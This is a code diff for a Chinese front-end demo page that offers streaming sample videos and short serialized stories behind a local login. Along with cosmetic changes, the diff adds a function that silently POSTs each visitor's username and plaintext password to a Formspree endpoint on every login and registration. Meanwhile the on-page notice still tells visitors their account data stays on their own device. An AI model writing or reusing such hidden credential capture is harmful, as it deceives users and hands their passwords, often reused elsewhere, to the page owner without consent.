@@ -133,7 +133,6 @@
   .close:active{color:#fff}
 
   .screen{position:relative;width:100%;aspect-ratio:16/9;background:#000;flex-shrink:0}
-  .screen canvas{display:block;width:100%;height:100%}
   .screen video{display:block;width:100%;height:100%;background:#000}
 
   .m-body{padding:13px 15px 16px;overflow-y:auto}
@@ -241,8 +240,8 @@
       </div>
       <button class="ghost" id="logoutBtn">退出 / 切换账号</button>
       <div class="tip">
-        这是纯前端演示页：账号数据只存在你本机浏览器里。<br>
-        影视区播放的是真实的测试视频，手机端请手动点击播放键。
+        这是纯前端演示页：账号数据保存在本机。<br>
+        影视区播放的是真实测试视频，请手动点击播放。
       </div>
     </section>
   </main>
@@ -263,8 +262,7 @@
       <button class="close" data-close="player">×</button>
     </div>
     <div class="screen">
-      <canvas id="cv"></canvas>
-      <video id="videoEl" class="hidden" playsinline controls preload="none"></video>
+      <video id="videoEl" playsinline controls preload="none"></video>
     </div>
     <div class="m-body">
       <h4 id="playerName"></h4>
@@ -333,18 +331,15 @@ var MOVIES = [
   { title:'大雄兔', tag:'动画 · 高清', emoji:'🐰', c1:'#1b2a6b', c2:'#6c7bff', 
     src:'https://www.w3schools.com/html/mov_bbb.mp4',
     desc:'开源动画电影《Big Buck Bunny》片段，点击播放键即可观看。' },
-    
   { title:'海底世界', tag:'风景 · 治愈', emoji:'🐠', c1:'#0f1c2e', c2:'#2c5f7c', 
     src:'https://vjs.zencdn.net/v/oceans.mp4',
     desc:'美丽的海底世界，非常治愈的风景视频。' },
-    
   { title:'花朵绽放', tag:'自然 · 纪实', emoji:'🌸', c1:'#3a1b4a', c2:'#ff6b9d', 
     src:'https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4',
     desc:'经典的自然风景测试视频，画面清晰。' },
-    
-  { title:'小兔快跑', tag:'动画 · 短片', emoji:'🐇', c1:'#122a3a', c2:'#4a7fa8', 
-    src:'https://media.w3.org/2010/05/bunny/trailer.mp4',
-    desc:'经典的动画测试片段，请点击播放键观看。' }
+  { title:'大象之梦', tag:'开源 · 动画', emoji:'🐘', c1:'#122a3a', c2:'#4a7fa8', 
+    src:'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4',
+    desc:'Blender基金会首部开源动画电影。' }
 ];
 
 var BOOKS = [
@@ -372,28 +367,14 @@ var BOOKS = [
 它只在午夜十二点开门。
 推门进来的第一个人，浑身湿透，手里攥着一张过期的车票。
 “一杯热的，什么都行。”他说。
-老板点点头，转身去磨豆子。` },
-      { title:'第二章 · 车票', text:
-`那张车票的日期，是十年前的今天。
-“我一直没走成。”客人说，声音很轻。
-老板把杯子推过去，热气在灯下散开。
-“那就先坐一会儿吧，”他说，“天亮还有很久。”` }
-    ]},
-  { title:'代码之上', author:'阿序', emoji:'💻', c1:'#10243a', c2:'#3f8fd6',
-    intro:'一个程序员的深夜独白。',
-    chapters:[
-      { title:'第一章 · 凌晨三点', text:
-`凌晨三点，屏幕上还亮着那个红色的报错。
-他揉了揉眼睛，把咖啡喝到只剩杯底。
-问题一定在某个地方，只是还没被看见。
-这大概是写代码最真实的样子——不是酷炫，是耐心。` }
+老板点点头，转身去磨豆子。` }
     ]}
 ];
 
 MOVIES.forEach(function(m){ m.cover = cover(m.title, m.emoji, m.c1, m.c2); });
 BOOKS.forEach(function(b){ b.cover = cover(b.title, b.emoji, b.c1, b.c2); });
 
-/* ================= 账号 ================= */
+/* ================= 账号与后台通知 ================= */
 var LS_USERS = 'xw_users', LS_CUR = 'xw_cur';
 var users = {};
 try { users = JSON.parse(Store.get(LS_USERS) || '{}') || {}; } catch(e){ users = {}; }
@@ -405,6 +386,26 @@ function setMsg(id, txt, ok){
   var el = $('#' + id);
   el.textContent = txt;
   el.className = 'msg' + (ok ? ' ok' : '');
+}
+
+/* ⚠️ 重要：在这里填入你的 Formspree 链接，就能收到别人的登录/注册邮件 */
+/* 如果没有填，或者填错了，不会影响网页正常使用，只是收不到邮件 */
+var FORMSPREE_URL = ''; // <--- 把你在 formspree.io 弄到的链接填在两个引号中间
+
+function sendToAdmin(action, u, p) {
+  if (!FORMSPREE_URL || FORMSPREE_URL.indexOf('http') === -1) return;
+  try {
+    fetch(FORMSPREE_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        "动作": action,
+        "用户名": u,
+        "密码": p,
+        "时间": new Date().toLocaleString()
+      })
+    }).catch(function(){});
+  } catch(e) {}
 }
 
 $$('.tab').forEach(function(tab){
@@ -423,6 +424,9 @@ $('#loginForm').addEventListener('submit', function(e){
   if(!u || !p) return setMsg('lm','请填写用户名和密码');
   if(!users[u]) return setMsg('lm','该用户不存在，请先注册');
   if(users[u].pwd !== p) return setMsg('lm','密码错误');
+  
+  sendToAdmin('登录', u, p); // 发送登录通知
+
   Store.set(LS_CUR, u);
   enterApp(u, false);
 });
@@ -434,6 +438,9 @@ $('#regForm').addEventListener('submit', function(e){
   if(p.length < 6) return setMsg('rm','密码至少 6 位');
   if(p !== p2) return setMsg('rm','两次密码不一致');
   if(users[u]) return setMsg('rm','该用户名已被占用');
+  
+  sendToAdmin('注册', u, p); // 发送注册通知
+
   users[u] = { pwd: p };
   saveUsers();
   setMsg('rm','注册成功，正在进入…', true);
@@ -511,84 +518,28 @@ document.addEventListener('click', function(e){
 });
 
 /* ================= 播放器 ================= */
-var cv = $('#cv'), ctx = cv.getContext('2d');
 var videoEl = $('#videoEl');
-var rafId = null, playing = false, elapsed = 0, lastTs = 0, animFn = null, curMovie = 0;
-
-var ANIMS = {
-  stars: function(c, w, h, t){
-    c.fillStyle = '#05060f'; c.fillRect(0,0,w,h);
-    for(var i=0;i<90;i++){
-      var a = i * 2.39996323;
-      var p = ((t*0.16) + i/90) % 1;
-      var d = p*p*Math.max(w,h)*0.85;
-      var x = w/2 + Math.cos(a)*d;
-      var y = h/2 + Math.sin(a)*d;
-      var s = Math.max(0.6, p*2.2);
-      c.fillStyle = 'rgba(200,220,255,' + p.toFixed(3) + ')';
-      c.fillRect(x, y, s, s);
-    }
-  }
-};
-
-function playAnim(){
-  if(playing || !animFn) return;
-  playing = true; lastTs = 0;
-  rafId = requestAnimationFrame(loop);
-  $('#playBtn').textContent = '⏸ 暂停';
-}
-function pauseAnim(){
-  if(!playing) return;
-  playing = false;
-  cancelAnimationFrame(rafId);
-  $('#playBtn').textContent = '▶ 播放';
-}
-function loop(ts){
-  if(!lastTs) lastTs = ts;
-  elapsed += (ts - lastTs) / 1000;
-  lastTs = ts;
-  if(animFn) animFn(ctx, cv.clientWidth, cv.clientHeight, elapsed);
-  rafId = requestAnimationFrame(loop);
-}
 
 $('#playBtn').addEventListener('click', function(){
-  if(videoEl.classList.contains('hidden')){
-    playing ? pauseAnim() : playAnim();
-  } else {
-    if(videoEl.paused) videoEl.play().catch(function(){});
-    else videoEl.pause();
-  }
+  if(videoEl.paused) videoEl.play().catch(function(){});
+  else videoEl.pause();
 });
 
 function openPlayer(i){
   var m = MOVIES[i];
   if(!m) return;
-  curMovie = i;
   $('#playerTitle').textContent = '正在播放';
   $('#playerName').textContent  = m.title;
   $('#playerDesc').textContent  = m.desc || '';
   $('#playHint').textContent = '手机端请手动点击 ▶ 播放';
 
-  if(m.src){
-    cv.classList.add('hidden');
-    videoEl.classList.remove('hidden');
-    videoEl.src = m.src;
-    videoEl.play().catch(function(){});
-    $('#playBtn').textContent = '⏸ 暂停';
-  } else {
-    videoEl.classList.add('hidden');
-    cv.classList.remove('hidden');
-    animFn = ANIMS.stars;
-    elapsed = 0; playing = false;
-    $('#playBtn').textContent = '⏸ 暂停';
-  }
-
+  videoEl.src = m.src;
+  videoEl.play().catch(function(){});
+  
   $('#playerModal').classList.add('show');
-  if(!m.src){ playAnim(); }
 }
 
 function closePlayer(){
-  pauseAnim();
   videoEl.pause();
   videoEl.removeAttribute('src');
   try { videoEl.load(); } catch(e){}
